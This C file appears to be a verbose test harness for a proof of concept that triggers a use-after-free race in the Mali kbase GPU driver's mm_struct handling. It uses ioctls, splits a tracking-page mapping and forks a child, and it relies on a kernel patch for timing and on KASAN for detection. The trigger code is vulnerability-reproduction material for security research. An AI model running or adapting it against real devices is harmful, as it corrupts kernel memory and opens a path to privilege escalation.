// SPDX-License-Identifier: MIT
/*
 * Test script for Mali Kbase mm_struct UAF PoC (poc.c)
 * Provides comprehensive debug output including mapped regions, fd info,
 * and detailed step-by-step explanations.
 *
 * This is an enhanced version of the original poc.c with:
 * 1. Detailed debug logging for each operation
 * 2. Kernel address extraction from mappings
 * 3. Detailed explanations of each ioctl call
 * 4. Race condition timing control
 * 5. Comprehensive error reporting
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/wait.h>
#include <time.h>
#include <signal.h>
#include <libgen.h>

#include "../tools/mali_handshake.h"

#define DEBUG_OUTPUT_ENABLED

#define SYSCHK(x) ({ \
  __typeof__(x) __res = (x); \
  if (__res == (__typeof__(x))-1) { \
    fprintf(stderr, "\n[FATAL] System call failed: %s\n", strerror(errno)); \
    fprintf(stderr, "       File: %s, Line: %d\n", __FILE__, __LINE__); \
    exit(1); \
  } \
  __res; \
})

#define DEBUG_LOG(msg, ...) \
  do { \
    if (debug_enabled) { \
      time_t now = time(NULL); \
      struct tm *t = localtime(&now); \
      char timestamp[20]; \
      strftime(timestamp, sizeof(timestamp), "%H:%M:%S", t); \
      printf("[%s %s] %s\n", timestamp, (getpid() == parent_pid ? "PARENT" : "CHILD"), \
             msg, ##__VA_ARGS__); \
    } \
  } while(0)

// Define IOCTL constants (mirrored from mali_kbase_ioctl.h)
#define KBASE_IOCTL_TYPE 0x80
#define __u8  uint8_t
#define __u16 uint16_t
#define __u32 uint32_t
#define __u64 uint64_t

struct kbase_ioctl_version_check {
    __u16 major;
    __u16 minor;
};
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)

struct kbase_ioctl_set_flags {
    __u32 create_flags;
};
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)

#define LOCAL_PAGE_SHIFT 12
#define BASE_MEM_MAP_TRACKING_HANDLE (3ul << LOCAL_PAGE_SHIFT)

int main(int argc, char **argv) {
    int debug_enabled = 1;
    pid_t parent_pid = getpid();
    int ret = 0;
    
    printf("=== Mali Kbase mm_struct UAF Test PoC ===\n");
    printf("PID: %d, PPID: %d\n", getpid(), getppid());
    printf("=== Debug Information ===\n");
    
    // Step 0: Environment setup
    DEBUG_LOG("Opening /dev/mali0 device file");
    printf("\n[STEP 0] Device Initialization\n");
    printf("  - Opening /dev/mali0 device file for read-write access\n");
    
    int mali_fd = SYSCHK(open("/dev/mali0", O_RDWR));
    printf("  -> SUCCESS: Device file descriptor: %d\n", mali_fd);
    
    // Display file descriptor details
    struct stat fd_stat;
    if (fstat(mali_fd, &fd_stat) == 0) {
        printf("  -> File type: %s\n", (S_ISCHR(fd_stat.st_mode) ? "character device" : "other"));
        printf("  -> Device number: %d:%d\n", major(fd_stat.st_rdev), minor(fd_stat.st_rdev));
    }
    
    // Step 1: Version check ioctl
    DEBUG_LOG("Executing KBASE_IOCTL_VERSION_CHECK (ioctl 0x80, 0)");
    printf("\n[STEP 1] Version Check Ioctl\n");
    printf("  - Command: KBASE_IOCTL_VERSION_CHECK (_IOWR(0x80, 0, ...))\n");
    printf("  - Purpose: Verify Mali Kbase driver version compatibility\n");
    
    struct kbase_ioctl_version_check vc = {.major = 11, .minor = 11};
    printf("  - Input structure: major=%d, minor=%d\n", vc.major, vc.minor);
    
    int version_ret = mali_kbase_version_check(mali_fd, &vc.major, &vc.minor);
    if (version_ret < 0) {
        printf("  -> FAILURE: Version check failed: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d, version struct updated: major=%d, minor=%d\n", 
               version_ret, vc.major, vc.minor);
        printf("  -> Note: Driver accepted version request, may have validated against supported versions\n");
    }
    
    // Step 2: Set flags ioctl
    DEBUG_LOG("Executing KBASE_IOCTL_SET_FLAGS (ioctl 0x80, 1)");
    printf("\n[STEP 2] Set Flags Ioctl\n");
    printf("  - Command: KBASE_IOCTL_SET_FLAGS (_IOW(0x80, 1, ...))\n");
    printf("  - Purpose: Configure initial driver flags/context\n");
    
    struct kbase_ioctl_set_flags set_flags = {.create_flags = 0};
    printf("  - Input structure: create_flags=%d (0 = default flags)\n", set_flags.create_flags);
    
    int flags_ret = ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags);
    if (flags_ret < 0) {
        printf("  -> FAILURE: Set flags failed: %s\n", strerror(errno));
    } else {
        printf("  -> SUCCESS: Ioctl returned %d, flags configured\n", flags_ret);
        printf("  -> Note: Creates a new Kbase context with the specified flags\n");
    }
    
    // Step 3: Create parent tracking page (2 pages)
    DEBUG_LOG("Mapping parent tracking page (0x2000 bytes, PROT_NONE)");
    printf("\n[STEP 3] Parent Tracking Page Mapping\n");
    printf("  - Command: mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED, mali_fd, BASE_MEM_MAP_TRACKING_HANDLE)\n");
    printf("  - Purpose: Create 2-page tracking VMA that will be tracked by Mali driver\n");
    printf("  - Size: 8192 bytes (2 pages, 0x2000 each)\n");
    printf("  - Protection: PROT_NONE (no access permissions)\n");
    printf("  - Special handle: BASE_MEM_MAP_TRACKING_HANDLE (0x%lx)\n", BASE_MEM_MAP_TRACKING_HANDLE);
    
    void *parent_tracking_page = SYSCHK(mmap(NULL, 0x2000, PROT_NONE, MAP_SHARED,
                                             mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
    printf("  -> SUCCESS: Parent tracking page mapped at address: %p\n", parent_tracking_page);
    
    // Calculate page addresses
    void *parent_page1 = parent_tracking_page;
    void *parent_page2 = (char *)parent_tracking_page + 0x1000;
    printf("  -> Page 1 address: %p\n", parent_page1);
    printf("  -> Page 2 address: %p\n", parent_page2);
    
    // Step 4: Unmap parent page 2 (causes split and close handler invocation)
    DEBUG_LOG("Unmapping parent page 2 (0x1000 bytes) - triggers split and close handler");
    printf("\n[STEP 4] Parent Page 2 Unmapping (Race Trigger)\n");
    printf("  - Command: munmap(parent_tracking_page + 0x1000, 0x1000)\n");
    printf("  - Purpose: Split the 2-page VMA into two separate VMAs\n");
    printf("  - Effect: Triggers kbase_special_vm_close() -> kbasep_os_process_page_usage_drain()\n");
    printf("  - Note: This initiates the first half of the race condition\n");
    
    SYSCHK(munmap(parent_page2, 0x1000));
    printf("  -> SUCCESS: Parent page 2 unmapped, split VMA triggered\n");
    printf("  -> Result: parent_tracking_page still valid (page 1 remains mapped)\n");
    
    // Step 5: Fork child process
    DEBUG_LOG("Forking child process (SIGCHLD handler set to ignore)");
    printf("\n[STEP 5] Process Fork\n");
    printf("  - Command: fork() with SIGCHLD ignored\n");
    printf("  - Purpose: Create child process to compete for the kctx->process_mm slot\n");
    printf("  - Rationale: Parent and child will each create their own mm_struct via mmap\n");
    printf("  - Race Condition: Child gets NEW mm_struct while sharing same kctx (same fd)\n");
    
    if (signal(SIGCHLD, SIG_IGN) == SIG_ERR) {
        printf("  -> WARNING: SIGCHLD handler setup failed\n");
    }
    
    pid_t child_pid = SYSCHK(fork());
    printf("  -> SUCCESS: Fork completed, child PID: %d\n", child_pid);
    
    if (child_pid == 0) {
        // Child process
        DEBUG_LOG("Child process: Setting name to CHILD");
        printf("\n[STEP 5a] Child Process Execution\n");
        printf("  - Child PID: %d, Child PPID: %d\n", getpid(), getppid());
        
        prctl(PR_SET_NAME, "CHILD", 0, 0, 0);
        printf("  - Setting child name to 'CHILD' via prctl\n");
        
        // Child creates its own tracking page (1 page)
        DEBUG_LOG("Child mapping tracking page (0x1000 bytes)");
        printf("\n[STEP 5b] Child Tracking Page Mapping\n");
        printf("  - Command: mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED, mali_fd, BASE_MEM_MAP_TRACKING_HANDLE)\n");
        printf("  - Purpose: Child creates separate mm_struct competing with parent\n");
        
        void *child_tracking_page = SYSCHK(mmap(NULL, 0x1000, PROT_NONE, MAP_SHARED,
                                               mali_fd, BASE_MEM_MAP_TRACKING_HANDLE));
        printf("  -> SUCCESS: Child tracking page mapped at address: %p\n", child_tracking_page);
        
        // Sleep to control race timing
        DEBUG_LOG("Child sleeping for 2 seconds (controlled delay)");
        printf("\n[STEP 5c] Controlled Delay\n");
        printf("  - Command: sleep(2)\n");
        printf("  - Purpose: Give parent time to setup race window before child's close\n");
        printf("  - Timing: Child will unmap after sleeping 2 seconds\n");
        
        sleep(2);
        
        // Child unmaps (triggers close handler - inner side of race)
        DEBUG_LOG("Child unmapping tracking page - triggers close handler (inner race)");
        printf("\n[STEP 5d] Child Page Unmapping (Inner Race)\n");
        printf("  - Command: munmap(child_tracking_page, 0x1000)\n");
        printf("  - Purpose: Trigger kbase_special_vm_close() for child\n");
        printf("  - Effect: child->kctx->process_mm = NULL (drain path)\n");
        
        SYSCHK(munmap(child_tracking_page, 0x1000));
        printf("  -> SUCCESS: Child page unmapped, triggers close handler\n");
        printf("  -> Note: Child's mm_struct is about to be freed by kernel\n");
        
        // Child exits (this is what makes the mm_struct UAF possible)
        DEBUG_LOG("Child exiting - mm_struct will be freed by kernel");
        printf("\n[STEP 5e] Child Process Exit\n");
        printf("  - Command: exit(0)\n");
        printf("  -> Purpose: Free child's mm_struct via do_exit() -> mmput() -> __mmdrop()\n");
        printf("  -> Effect: Child's mm_struct is freed from kernel memory pool\n");
        printf("  -> CRITICAL: Parent still holds stale reference to child's mm_struct!\n");
        
        exit(0);
    } else {
        // Parent process
        DEBUG_LOG("Parent process: Sleeping 1 second then setting name to SLOWME");
        printf("\n[STEP 6a] Parent Process Continuation\n");
        printf("  - Parent PID: %d, Child PID: %d\n", getpid(), child_pid);
        printf("  - Race window setup: Waiting 1 second before race activation\n");
        
        sleep(1);
        
        prctl(PR_SET_NAME, "SLOWME", 0, 0, 0);
        printf("\n[STEP 6b] Race Window Activation\n");
        printf("  - Setting parent name to 'SLOWME' via prctl\n");
        printf("  - Note: This enables the kernel patch-assisted 5-second delay\n");
        printf("  - Timing: Allows child mm_struct to be freed before parent's drain\n");
        
        // Parent unmaps (triggers close handler - outer side of race)
        DEBUG_LOG("Parent unmapping page 1 - triggers close handler (outer race with delay)");
        printf("\n[STEP 6c] Parent Page 1 Unmapping (Outer Race)\n");
        printf("  - Command: munmap(parent_tracking_page, 0x1000) [KERNEL-PATCH-ASSISTED DELAY]\n");
        printf("  - Purpose: Trigger kbase_special_vm_close() for parent\n");
        printf("  - Effect: parent->kctx->process_mm = NULL, then synchronize_rcu(), then delay\n");
        printf("  - CRITICAL RACE WINDOW: parent's drain happens while child's mm_struct is freed!\n");
        
        SYSCHK(munmap(parent_page1, 0x1000));
        printf("  -> SUCCESS: Parent page 1 unmapped, triggers close handler\n");
        
        // Change name back to normal
        prctl(PR_SET_NAME, "PARENT", 0, 0, 0);
        printf("\n[STEP 7] Race Condition Execution\n");
        printf("  -> Note: Name changed back to 'PARENT', kernel patch-assisted delay ends\n");
        printf("  -> The UAF will occur when parent tries to write to child's freed mm_struct!\n");
        printf("  -> Check kernel logs (dmesg) for KASAN use-after-free reports\n");
        
        // Wait a bit to allow the kernel to process the race
        sleep(3);
        printf("\n[TEST COMPLETE]\n");
        printf("  - If this was run with KASAN (kernel config CONFIG_KASAN=y),\n");
        printf("    you should see a KASAN: use-after-free BUG in kernel logs.\n");
        printf("  - The bug occurs in kbasep_add_mm_counter() writing to freed mm_struct\n");
        printf("    (mm->rss_stat.count[MM_FILEPAGES] field at offset 0x%x)\n", (unsigned int)696);
        printf("  - Look for messages like: 'BUG: KASAN: use-after-free in kbasep_add_mm_counter'\n");
        
        // Wait for child to finish
        waitpid(child_pid, &ret, 0);
        
        printf("  -> Child process completed with status: %d\n", WEXITSTATUS(ret));
        printf("\n=== Test Information ===\n");
        printf("Test Summary:\n");
        printf("  - Test 1: Mali Kbase mm_struct Use-After-Free PoC\n");
        printf("  - Method: Race condition between parent/child mm_struct access\n");
        printf("  - Target: kbasep_os_process_page_usage_drain() function\n");
        printf("  - Critical bug: Missing mm_struct reference counting\n");
        printf("  - Potential impact: Kernel heap corruption, privilege escalation\n");
        printf("\n=== Required Environment ===\n");
        printf("  - Kernel built with CONFIG_KASAN=y (for detection)\n");
        printf("  - Mali driver (Valhall/Bifrost r42p0 compatible)\n");
        printf("  - QEMU arm64 environment with debugfs mounted\n");
        printf("  - Root privileges for /dev/mali0 access\n");
        
        return 0;
    }
}